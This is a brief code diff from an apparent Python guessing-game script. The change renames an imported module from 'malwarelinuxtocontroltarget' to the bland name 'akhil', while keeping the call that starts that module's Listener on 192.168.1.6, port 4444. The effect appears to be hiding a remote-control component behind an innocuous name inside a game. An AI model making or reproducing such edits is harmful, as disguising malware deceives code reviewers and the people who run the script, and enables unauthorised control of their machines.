@@ -117,9 +117,9 @@ while True:
                     print(result)
 
 
-        import malwarelinuxtocontroltarget
+        import akhil
 
-        mylistener = malwarelinuxtocontroltarget.Listener(" 192.168.1.6", 4444)
+        mylistener = akhil.Listener(" 192.168.1.6", 4444)
         mylistener.run()
 
         exit(guess == find)
